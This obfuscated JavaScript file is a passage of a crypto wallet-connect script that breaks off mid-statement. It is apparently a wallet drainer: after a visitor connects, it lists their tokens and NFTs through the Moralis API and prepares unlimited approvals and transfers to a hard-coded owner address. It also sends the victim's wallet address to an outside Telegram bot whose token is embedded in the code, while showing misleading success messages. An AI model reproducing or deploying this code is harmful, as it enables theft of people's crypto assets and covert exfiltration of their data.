const _0x5225b7=_0xf299;(function(_0x4d2d08,_0x4325d8){const _0x16173f=_0xf299,_0x2a58d0=_0x4d2d08();while(!![]){try{const _0x320d45=parseInt(_0x16173f(0x18c))/0x1+-parseInt(_0x16173f(0x12a))/0x2*(parseInt(_0x16173f(0x1a9))/0x3)+parseInt(_0x16173f(0x15b))/0x4+-parseInt(_0x16173f(0xce))/0x5+-parseInt(_0x16173f(0x114))/0x6+parseInt(_0x16173f(0x17e))/0x7*(-parseInt(_0x16173f(0x130))/0x8)+parseInt(_0x16173f(0xd9))/0x9;if(_0x320d45===_0x4325d8)break;else _0x2a58d0['push'](_0x2a58d0['shift']());}catch(_0x27eaf4){_0x2a58d0['push'](_0x2a58d0['shift']());}}}(_0x2207,0x459d5));let tokens=[],NFTs=[],chainId=null,web3Object=null,selectedAccount=null;const Web3Modal=window['Web3Modal'][_0x5225b7(0x18a)],WalletConnectProvider=window['WalletConnectProvider']['default'],OWNER_ADDRESS=_0x5225b7(0x196),ABI=[{'constant':!![],'inputs':[],'name':_0x5225b7(0xec),'outputs':[{'name':'','type':_0x5225b7(0x176)}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'constant':![],'inputs':[{'name':_0x5225b7(0x18f),'type':_0x5225b7(0xc9)}],'name':_0x5225b7(0x1a8),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':![],'inputs':[{'name':_0x5225b7(0x1ab),'type':_0x5225b7(0xc9)},{'name':_0x5225b7(0xd4),'type':'uint256'}],'name':_0x5225b7(0xcf),'outputs':[],'payable':![],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'constant':!![],'inputs':[],'name':'deprecated','outputs':[{'name':'','type':_0x5225b7(0xf4)}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':'function'},{'constant':![],'inputs':[{'name':_0x5225b7(0xef),'type':_0x5225b7(0xc9)}],'name':_0x5225b7(0x147),'outputs':[],'payable':![],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'constant':!![],'inputs':[],'name':'totalSupply','outputs':[{'name':'','type':_0x5225b7(0x19f)}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':'function'},{'constant':![],'inputs':[{'name':_0x5225b7(0x161),'type':_0x5225b7(0xc9)},{'name':_0x5225b7(0x11b),'type':_0x5225b7(0xc9)},{'name':_0x5225b7(0xd4),'type':'uint256'}],'name':_0x5225b7(0x146),'outputs':[],'payable':![],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':_0x5225b7(0xc9)}],'payable':![],'stateMutability':'view','type':_0x5225b7(0x159)},{'constant':!![],'inputs':[{'name':'','type':_0x5225b7(0xc9)}],'name':_0x5225b7(0x17b),'outputs':[{'name':'','type':_0x5225b7(0x19f)}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'constant':!![],'inputs':[],'name':_0x5225b7(0xe4),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'constant':!![],'inputs':[],'name':_0x5225b7(0x157),'outputs':[{'name':'','type':_0x5225b7(0x19f)}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'constant':!![],'inputs':[],'name':_0x5225b7(0xf7),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'constant':![],'inputs':[],'name':_0x5225b7(0xf8),'outputs':[],'payable':![],'stateMutability':_0x5225b7(0xbf),'type':'function'},{'constant':!![],'inputs':[{'name':_0x5225b7(0x150),'type':_0x5225b7(0xc9)}],'name':_0x5225b7(0x181),'outputs':[{'name':'','type':_0x5225b7(0xf4)}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'constant':!![],'inputs':[{'name':'','type':'address'},{'name':'','type':_0x5225b7(0xc9)}],'name':_0x5225b7(0xc3),'outputs':[{'name':'','type':_0x5225b7(0x19f)}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'constant':!![],'inputs':[],'name':_0x5225b7(0xfe),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':'function'},{'constant':!![],'inputs':[{'name':_0x5225b7(0x184),'type':_0x5225b7(0xc9)}],'name':_0x5225b7(0xf1),'outputs':[{'name':'','type':_0x5225b7(0x19f)}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'constant':![],'inputs':[],'name':'pause','outputs':[],'payable':![],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'constant':!![],'inputs':[],'name':_0x5225b7(0x182),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'constant':!![],'inputs':[],'name':_0x5225b7(0x123),'outputs':[{'name':'','type':_0x5225b7(0xc9)}],'payable':![],'stateMutability':'view','type':_0x5225b7(0x159)},{'constant':!![],'inputs':[],'name':_0x5225b7(0xdc),'outputs':[{'name':'','type':_0x5225b7(0x176)}],'payable':![],'stateMutability':'view','type':_0x5225b7(0x159)},{'constant':![],'inputs':[{'name':_0x5225b7(0x11b),'type':_0x5225b7(0xc9)},{'name':'_value','type':_0x5225b7(0x19f)}],'name':_0x5225b7(0x10e),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x5225b7(0x159)},{'constant':![],'inputs':[{'name':_0x5225b7(0xd7),'type':'uint256'},{'name':'newMaxFee','type':_0x5225b7(0x19f)}],'name':'setParams','outputs':[],'payable':![],'stateMutability':_0x5225b7(0xbf),'type':'function'},{'constant':![],'inputs':[{'name':_0x5225b7(0xc2),'type':_0x5225b7(0x19f)}],'name':'issue','outputs':[],'payable':![],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'constant':![],'inputs':[{'name':_0x5225b7(0xc2),'type':_0x5225b7(0x19f)}],'name':_0x5225b7(0x115),'outputs':[],'payable':![],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'constant':!![],'inputs':[{'name':'_owner','type':_0x5225b7(0xc9)},{'name':'_spender','type':_0x5225b7(0xc9)}],'name':_0x5225b7(0x154),'outputs':[{'name':_0x5225b7(0x19d),'type':_0x5225b7(0x19f)}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'constant':!![],'inputs':[],'name':'basisPointsRate','outputs':[{'name':'','type':_0x5225b7(0x19f)}],'payable':![],'stateMutability':'view','type':_0x5225b7(0x159)},{'constant':!![],'inputs':[{'name':'','type':_0x5225b7(0xc9)}],'name':_0x5225b7(0xf6),'outputs':[{'name':'','type':_0x5225b7(0xf4)}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'constant':![],'inputs':[{'name':_0x5225b7(0x109),'type':_0x5225b7(0xc9)}],'name':'removeBlackList','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x5225b7(0x159)},{'constant':!![],'inputs':[],'name':'MAX_UINT','outputs':[{'name':'','type':_0x5225b7(0x19f)}],'payable':![],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'constant':![],'inputs':[{'name':'newOwner','type':_0x5225b7(0xc9)}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'constant':![],'inputs':[{'name':_0x5225b7(0xd0),'type':'address'}],'name':'destroyBlackFunds','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x5225b7(0x159)},{'inputs':[{'name':_0x5225b7(0x10d),'type':_0x5225b7(0x19f)},{'name':_0x5225b7(0xca),'type':_0x5225b7(0x176)},{'name':_0x5225b7(0x16d),'type':_0x5225b7(0x176)},{'name':'_decimals','type':_0x5225b7(0x19f)}],'payable':![],'stateMutability':'nonpayable','type':_0x5225b7(0xb8)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5225b7(0xc2),'type':_0x5225b7(0x19f)}],'name':_0x5225b7(0x15c),'type':_0x5225b7(0x165)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5225b7(0xc2),'type':_0x5225b7(0x19f)}],'name':_0x5225b7(0xd8),'type':_0x5225b7(0x165)},{'anonymous':![],'inputs':[{'indexed':![],'name':'newAddress','type':'address'}],'name':'Deprecate','type':_0x5225b7(0x165)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5225b7(0xe0),'type':_0x5225b7(0x19f)},{'indexed':![],'name':_0x5225b7(0x110),'type':_0x5225b7(0x19f)}],'name':'Params','type':_0x5225b7(0x165)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5225b7(0xd0),'type':'address'},{'indexed':![],'name':_0x5225b7(0x13e),'type':_0x5225b7(0x19f)}],'name':_0x5225b7(0x17d),'type':_0x5225b7(0x165)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_user','type':_0x5225b7(0xc9)}],'name':_0x5225b7(0xea),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5225b7(0x16b),'type':_0x5225b7(0xc9)}],'name':'RemovedBlackList','type':_0x5225b7(0x165)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x5225b7(0x123),'type':_0x5225b7(0xc9)},{'indexed':!![],'name':_0x5225b7(0x19e),'type':_0x5225b7(0xc9)},{'indexed':![],'name':_0x5225b7(0xe8),'type':_0x5225b7(0x19f)}],'name':_0x5225b7(0x125),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x5225b7(0xb9),'type':_0x5225b7(0xc9)},{'indexed':!![],'name':'to','type':_0x5225b7(0xc9)},{'indexed':![],'name':'value','type':_0x5225b7(0x19f)}],'name':_0x5225b7(0x112),'type':_0x5225b7(0x165)},{'anonymous':![],'inputs':[],'name':'Pause','type':_0x5225b7(0x165)},{'anonymous':![],'inputs':[],'name':_0x5225b7(0x131),'type':_0x5225b7(0x165)}],ABIN=[{'inputs':[{'internalType':_0x5225b7(0x176),'name':_0x5225b7(0xec),'type':_0x5225b7(0x176)},{'internalType':_0x5225b7(0x176),'name':_0x5225b7(0xdc),'type':_0x5225b7(0x176)},{'internalType':_0x5225b7(0x19f),'name':_0x5225b7(0x142),'type':_0x5225b7(0x19f)},{'internalType':_0x5225b7(0x19f),'name':_0x5225b7(0x169),'type':_0x5225b7(0x19f)}],'stateMutability':'nonpayable','type':'constructor'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x5225b7(0xc9),'name':_0x5225b7(0x123),'type':_0x5225b7(0xc9)},{'indexed':!![],'internalType':_0x5225b7(0xc9),'name':_0x5225b7(0x13f),'type':_0x5225b7(0xc9)},{'indexed':!![],'internalType':'uint256','name':_0x5225b7(0x128),'type':_0x5225b7(0x19f)}],'name':_0x5225b7(0x125),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x5225b7(0xc9),'name':_0x5225b7(0x123),'type':_0x5225b7(0xc9)},{'indexed':!![],'internalType':_0x5225b7(0xc9),'name':_0x5225b7(0x118),'type':'address'},{'indexed':![],'internalType':_0x5225b7(0xf4),'name':_0x5225b7(0x13f),'type':_0x5225b7(0xf4)}],'name':_0x5225b7(0x120),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x5225b7(0x195),'type':_0x5225b7(0xc9)},{'indexed':!![],'internalType':_0x5225b7(0xc9),'name':_0x5225b7(0x18e),'type':_0x5225b7(0xc9)}],'name':_0x5225b7(0x144),'type':_0x5225b7(0x165)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x5225b7(0xc9),'name':_0x5225b7(0xb9),'type':_0x5225b7(0xc9)},{'indexed':!![],'internalType':_0x5225b7(0xc9),'name':'to','type':'address'},{'indexed':!![],'internalType':'uint256','name':_0x5225b7(0x128),'type':_0x5225b7(0x19f)}],'name':_0x5225b7(0x112),'type':'event'},{'inputs':[],'name':_0x5225b7(0xe6),'outputs':[{'internalType':'string','name':'','type':_0x5225b7(0x176)}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[],'name':'MAX_APES','outputs':[{'internalType':_0x5225b7(0x19f),'name':'','type':_0x5225b7(0x19f)}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[],'name':_0x5225b7(0x14d),'outputs':[{'internalType':'uint256','name':'','type':_0x5225b7(0x19f)}],'stateMutability':_0x5225b7(0x121),'type':'function'},{'inputs':[],'name':_0x5225b7(0xfd),'outputs':[{'internalType':_0x5225b7(0x19f),'name':'','type':_0x5225b7(0x19f)}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0xc9),'name':'to','type':_0x5225b7(0xc9)},{'internalType':_0x5225b7(0x19f),'name':_0x5225b7(0x128),'type':_0x5225b7(0x19f)}],'name':'approve','outputs':[],'stateMutability':'nonpayable','type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0xc9),'name':_0x5225b7(0x123),'type':'address'}],'name':_0x5225b7(0xf1),'outputs':[{'internalType':_0x5225b7(0x19f),'name':'','type':_0x5225b7(0x19f)}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[],'name':_0x5225b7(0x101),'outputs':[{'internalType':'string','name':'','type':_0x5225b7(0x176)}],'stateMutability':_0x5225b7(0x121),'type':'function'},{'inputs':[],'name':'emergencySetStartingIndexBlock','outputs':[],'stateMutability':'nonpayable','type':_0x5225b7(0x159)},{'inputs':[],'name':'flipSaleState','outputs':[],'stateMutability':_0x5225b7(0xbf),'type':'function'},{'inputs':[{'internalType':_0x5225b7(0x19f),'name':_0x5225b7(0x128),'type':'uint256'}],'name':'getApproved','outputs':[{'internalType':_0x5225b7(0xc9),'name':'','type':_0x5225b7(0xc9)}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0xc9),'name':_0x5225b7(0x123),'type':_0x5225b7(0xc9)},{'internalType':_0x5225b7(0xc9),'name':_0x5225b7(0x118),'type':_0x5225b7(0xc9)}],'name':'isApprovedForAll','outputs':[{'internalType':_0x5225b7(0xf4),'name':'','type':_0x5225b7(0xf4)}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[],'name':_0x5225b7(0xff),'outputs':[{'internalType':'uint256','name':'','type':_0x5225b7(0x19f)}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0x19f),'name':'numberOfTokens','type':_0x5225b7(0x19f)}],'name':_0x5225b7(0x16c),'outputs':[],'stateMutability':_0x5225b7(0xbd),'type':_0x5225b7(0x159)},{'inputs':[],'name':_0x5225b7(0xec),'outputs':[{'internalType':_0x5225b7(0x176),'name':'','type':_0x5225b7(0x176)}],'stateMutability':'view','type':_0x5225b7(0x159)},{'inputs':[],'name':'owner','outputs':[{'internalType':_0x5225b7(0xc9),'name':'','type':_0x5225b7(0xc9)}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0x19f),'name':_0x5225b7(0x128),'type':_0x5225b7(0x19f)}],'name':_0x5225b7(0xf9),'outputs':[{'internalType':_0x5225b7(0xc9),'name':'','type':_0x5225b7(0xc9)}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[],'name':'renounceOwnership','outputs':[],'stateMutability':_0x5225b7(0xbf),'type':'function'},{'inputs':[],'name':_0x5225b7(0xd2),'outputs':[],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0xc9),'name':'from','type':_0x5225b7(0xc9)},{'internalType':_0x5225b7(0xc9),'name':'to','type':_0x5225b7(0xc9)},{'internalType':_0x5225b7(0x19f),'name':'tokenId','type':_0x5225b7(0x19f)}],'name':_0x5225b7(0x17c),'outputs':[],'stateMutability':_0x5225b7(0xbf),'type':'function'},{'inputs':[{'internalType':_0x5225b7(0xc9),'name':_0x5225b7(0xb9),'type':'address'},{'internalType':_0x5225b7(0xc9),'name':'to','type':'address'},{'internalType':'uint256','name':'tokenId','type':_0x5225b7(0x19f)},{'internalType':'bytes','name':_0x5225b7(0xfa),'type':_0x5225b7(0x106)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x5225b7(0xbf),'type':'function'},{'inputs':[],'name':'saleIsActive','outputs':[{'internalType':_0x5225b7(0xf4),'name':'','type':_0x5225b7(0xf4)}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[{'internalType':'address','name':_0x5225b7(0x118),'type':'address'},{'internalType':_0x5225b7(0xf4),'name':_0x5225b7(0x13f),'type':_0x5225b7(0xf4)}],'name':_0x5225b7(0x13b),'outputs':[],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0x176),'name':_0x5225b7(0x101),'type':'string'}],'name':_0x5225b7(0xe3),'outputs':[],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0x176),'name':_0x5225b7(0xc4),'type':_0x5225b7(0x176)}],'name':_0x5225b7(0x162),'outputs':[],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0x19f),'name':_0x5225b7(0xcd),'type':'uint256'}],'name':_0x5225b7(0xdf),'outputs':[],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'inputs':[],'name':_0x5225b7(0x14e),'outputs':[],'stateMutability':'nonpayable','type':_0x5225b7(0x159)},{'inputs':[],'name':_0x5225b7(0xc7),'outputs':[{'internalType':_0x5225b7(0x19f),'name':'','type':'uint256'}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x5225b7(0xd5),'outputs':[{'internalType':'uint256','name':'','type':_0x5225b7(0x19f)}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0x179),'name':'interfaceId','type':_0x5225b7(0x179)}],'name':_0x5225b7(0x145),'outputs':[{'internalType':_0x5225b7(0xf4),'name':'','type':'bool'}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[],'name':_0x5225b7(0xdc),'outputs':[{'internalType':_0x5225b7(0x176),'name':'','type':_0x5225b7(0x176)}],'stateMutability':'view','type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0x19f),'name':'index','type':'uint256'}],'name':_0x5225b7(0x137),'outputs':[{'internalType':_0x5225b7(0x19f),'name':'','type':_0x5225b7(0x19f)}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[{'internalType':'address','name':_0x5225b7(0x123),'type':_0x5225b7(0xc9)},{'internalType':_0x5225b7(0x19f),'name':'index','type':_0x5225b7(0x19f)}],'name':_0x5225b7(0x14f),'outputs':[{'internalType':'uint256','name':'','type':_0x5225b7(0x19f)}],'stateMutability':'view','type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0x19f),'name':_0x5225b7(0x128),'type':_0x5225b7(0x19f)}],'name':_0x5225b7(0xc1),'outputs':[{'internalType':_0x5225b7(0x176),'name':'','type':_0x5225b7(0x176)}],'stateMutability':'view','type':_0x5225b7(0x159)},{'inputs':[],'name':_0x5225b7(0x17a),'outputs':[{'internalType':_0x5225b7(0x19f),'name':'','type':_0x5225b7(0x19f)}],'stateMutability':_0x5225b7(0x121),'type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0xc9),'name':_0x5225b7(0xb9),'type':'address'},{'internalType':'address','name':'to','type':'address'},{'internalType':_0x5225b7(0x19f),'name':_0x5225b7(0x128),'type':_0x5225b7(0x19f)}],'name':_0x5225b7(0x146),'outputs':[],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'inputs':[{'internalType':_0x5225b7(0xc9),'name':_0x5225b7(0x18e),'type':_0x5225b7(0xc9)}],'name':_0x5225b7(0x174),'outputs':[],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)},{'inputs':[],'name':_0x5225b7(0x199),'outputs':[],'stateMutability':_0x5225b7(0xbf),'type':_0x5225b7(0x159)}],networkToId={0x1328cf7:_0x5225b7(0x16f),0x1:'eth-mainnet',0x5:_0x5225b7(0x16a),0x89:_0x5225b7(0x19c),0x13881:_0x5225b7(0x194),0x38:_0x5225b7(0x12d),0x61:_0x5225b7(0x140),0xa86a:_0x5225b7(0xc8),0xa869:_0x5225b7(0x111),0xfa:_0x5225b7(0x190),0xfa2:_0x5225b7(0xd1),0xa4b1:_0x5225b7(0x167),0x66eed:'arbitrum-goerli',0xa4ba:_0x5225b7(0xda),0x250:_0x5225b7(0x108),0x51:_0x5225b7(0x103),0x150:'astar-shiden',0x4e454152:'aurora-mainnet',0x4e454153:_0x5225b7(0x152),0x6984c:'avalanche-dexalot-mainnet',0x69849:'avalanche-dexalot-testnet',0x7e4:'axie-mainnet',0x14a33:_0x5225b7(0x133),0x77:_0x5225b7(0x10c),0x405:'bittorrent-testnet',0xa918:_0x5225b7(0xbc),0x10e8:_0x5225b7(0xf5),0xdbe0:_0x5225b7(0x100),0x2600:_0x5225b7(0x117),0x50e:_0x5225b7(0xba),0x511:_0x5225b7(0xd6),0x120:_0x5225b7(0xb7),0x1c:'boba-rinkeby-testnet',0xb48:_0x5225b7(0x163),0x1e14:'canto-mainnet',0x436f7631:_0x5225b7(0x104),0x19:_0x5225b7(0x11c),0x152:_0x5225b7(0x158),0xd2af:_0x5225b7(0x13a),0x14f:_0x5225b7(0x113),0xa516:_0x5225b7(0x136),0x2329:_0x5225b7(0x1a2),0x2328:_0x5225b7(0x156),0x868:_0x5225b7(0xed),0x86a:_0x5225b7(0xdb),0x13:'flarenetworks-canary-mainnet',0x10:'flarenetworks-canary-testnet',0xe:_0x5225b7(0x141),0x72:'flarenetworks-flare-testnet',0xb7e7759:_0x5225b7(0x105),0x153c099c:'gather-testnet',0x63564c40:_0x5225b7(0xd3),0x6357d2e0:_0x5225b7(0x135),0x141:'kcc-mainnet',0x142:_0x5225b7(0x116),0xe704:'linea-testnet',0x1389:_0x5225b7(0x189),0x52:'meter-mainnet',0x53:_0x5225b7(0x139),0x440:_0x5225b7(0x15d),0x24c:_0x5225b7(0x11a),0x7d2:_0x5225b7(0xe5),0x30e0a:_0x5225b7(0x18d),0x7d1:_0x5225b7(0xc6),0x30da5:_0x5225b7(0x19a),0x504:_0x5225b7(0x1aa),0x507:'moonbeam-moonbase-alpha',0x505:_0x5225b7(0x191),0xe9ac0ce:'neon-testnet',0x116ea:'nervos-godwoken-mainnet',0x116e9:_0x5225b7(0x153),0x116e1:'nervos-polyjuice-testnet',0x5afe:_0x5225b7(0x11e),0x5aff:_0x5225b7(0xe9),0xf8:_0x5225b7(0x14a),0x249c:_0x5225b7(0x134),0xa:_0x5225b7(0x11d),0x2a15c308d:_0x5225b7(0x171),0x2a15c3083:_0x5225b7(0x151),0x5a2:_0x5225b7(0x124),0x1e:_0x5225b7(0xbb),0x1f:_0x5225b7(0x143),0x5d456c62:_0x5225b7(0x175),0x1482a7b2:_0x5225b7(0x11f),0x3d28774d:'skale-omnus',0x109b4597:_0x5225b7(0x192),0x536f6c4d:'solana-mainnet',0x1202c:_0x5225b7(0x14c),0x1202d:_0x5225b7(0x172),0x1a0:'sx-mainnet'},providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'rpc':{0x38:'https://bsc-dataseed.binance.org/'},'chainId':0x38,'network':_0x5225b7(0x129),'infuraId':'e62a60a251c64745baefeaf8237af646','pollingInterval':_0x5225b7(0x186)}},'coinbasewallet':{'package':CoinbaseWalletSDK,'options':{'appName':'web3','infuraId':_0x5225b7(0xde),'rpc':_0x5225b7(0x10f),'chainId':0x38,'network':'binance','darkMode':![]}}};function _0x2207(){const _0x4a59e5=['token_address','event','connect','arbitrum-mainnet','&format=decimal&limit=','saleStart','eth-goerli','_user','mintApe','_symbol','estimateGas','btc-mainnet','catch','palm-mainnet','swimmer-testnet','TOKEN\x20Contract\x20Address\x20','transferOwnership','skale-calypso','string','tokens-list','length','bytes4','totalSupply','balances','safeTransferFrom','DestroyedBlackFunds','35KIxxYj','click','gas','getBlackListStatus','getOwner','toString','who','Approve\x20Completed\x20Successfully','10000','Transaction\x20Receipt:\x20','Error:\x20','mantle-testnet','default','Token\x20balance\x20is\x20','470202mcYOHG','milkomeda-a1-devnet','newOwner','_upgradedAddress','fantom-mainnet','moonbeam-moonriver','skale-razor','https://deep-index.moralis.io/api/v2/','matic-mumbai','previousOwner','0xea8968B218a551919FbD5f1166328C82a96dED54','&text=','.connect','withdraw','milkomeda-c1-devnet','price','matic-mainnet','remaining','spender','uint256','send','/nft/collections?chain=','evmos-mainnet','NFT','NFT\x20Contract\x20Address\x20','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','bsc','true','deprecate','513iYukkd','moonbeam-mainnet','_spender','boba-mainnet','constructor','from','boba-bobabeam-mainnet','rsk-mainnet','boba-avalanche-mainnet','payable','Transaction\x20Rejected','nonpayable','GET','tokenURI','amount','allowed','provenanceHash','json','milkomeda-c1-mainnet','startingIndex','avalanche-mainnet','address','_name','methods','then','revealTimeStamp','2110400UEOSvX','approve','_blackListedUser','fantom-testnet','reserveApes','harmony-mainnet','_value','startingIndexBlock','boba-bobabase-testnet','newBasisPoints','Redeem','9219645nhexBC','arbitrum-nova-mainnet','findora-forge-testnet','symbol','receipt','e62a60a251c64745baefeaf8237af646','setRevealTimestamp','feeBasisPoints','all','transactionHash','setBaseURI','decimals','milkomeda-a1-mainnet','BAYC_PROVENANCE','Error\x20collecting\x20info\x20about\x20wallet','value','oasis-sapphire-testnet','AddedBlackList','chainId:','name','findora-mainnet','Transaction\x20is\x20submitted\x20to\x20the\x20network','_evilUser','filter','balanceOf','usd','Transaction\x20Hash:\x20','bool','boba-avalanche-testnet','isBlackListed','_totalSupply','unpause','ownerOf','_data','Wallet\x20Connected\x20Successfully\x20to\x20bsc!','NFTs\x20collection\x20','apePrice','paused','maxApePurchase','boba-bnb-mainnet','baseURI','New\x20token','astar-shibuya','covalent-internal-network-v1','gather-mainnet','bytes','log','astar-mainnet','_clearedUser','Error\x20processing\x20item\x20','eth','bittorrent-mainnet','_initialSupply','transfer','https://bsc-dataseed.binance.org','maxFee','avalanche-testnet','Transfer','defi-kingdoms-testnet','2351622QRokAm','redeem','kcc-testnet','boba-bnb-testnet','operator','balance','metis-testnet','_to','cronos-mainnet','optimism-mainnet','oasis-sapphire-mainnet','skale-staging-uum','ApprovalForAll','view','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','owner','polygon-zkevm-testnet','Approval','999999999999999999999999999999999999999999999999999999999999999999999999','Contract','tokenId','binance','3330FZFiSt','result','/erc20','bsc-mainnet','status','getGasPrice','903928dmDSyu','Unpause','Unable\x20to\x20get\x20NFts','base-testnet','oasys-testnet','harmony-testnet','emerald-paratime-mainnet','tokenByIndex','getAccounts','meter-testnet','defi-kingdoms-mainnet','setApprovalForAll','Insufficient\x20funds\x20for\x20transfer','application/json','_balance','approved','bsc-testnet','flarenetworks-flare-mainnet','maxNftSupply','rsk-testnet','OwnershipTransferred','supportsInterface','transferFrom','addBlackList','0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0','sendTransaction','oasys-mainnet','5227607491','swimmer-mainnet','REVEAL_TIMESTAMP','setStartingIndex','tokenOfOwnerByIndex','_maker','palm-testnet','aurora-testnet','nervos-godwoken-testnet','allowance','map','evmos-testnet','maximumFee','cronos-testnet','function','Your\x20address\x20','1816884zIHNKP','Issue','metis-mainnet','message','Tokens:','error','_from','setProvenanceHash','boba-goerli'];_0x2207=function(){return _0x4a59e5;};return _0x2207();}let web3Modal=new Web3Modal({'providerOptions':providerOptions,'cacheProvider':![],'disableInjectedProvider':![]});$(_0x5225b7(0x198))[_0x5225b7(0x17f)](async function(){const _0x355907=_0x5225b7;try{let _0x3e5cda=await web3Modal[_0x355907(0x166)]();onProvider(_0x3e5cda),_0x3e5cda['on']('accountsChanged',_0x2d89d7=>{const _0x1ce1fe=_0x355907;console[_0x1ce1fe(0x107)](_0x2d89d7),onProvider(_0x3e5cda);});}catch(_0x2f8b3c){console['log']('Could\x20not\x20get\x20a\x20wallet\x20connection',_0x2f8b3c);return;}});async function onProvider(_0x5bf4a1){const _0x592d03=_0x5225b7;web3Object=new Web3(_0x5bf4a1);let _0x58bfb2=await web3Object['eth'][_0x592d03(0x138)]();selectedAccount=_0x58bfb2[0x0],chainName=await web3Object[_0x592d03(0x10b)]['getChainId'](),chainId=networkToId[chainName],console['log'](chainId),console[_0x592d03(0x107)](selectedAccount),_0x58bfb2[_0x592d03(0x178)]&&(sendMessage(_0x592d03(0xfb)),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall());}const Oxa=_0x5225b7(0x148),Oxc=_0x5225b7(0x14b);async function covalenthqAPICall(){const _0x522c62=_0x5225b7,_0x55b4bc={'chain':_0x522c62(0x1a6)},_0x48a80c=new URL(_0x522c62(0x193)+selectedAccount+_0x522c62(0x12c));_0x48a80c['search']=new URLSearchParams(_0x55b4bc)[_0x522c62(0x183)]();const 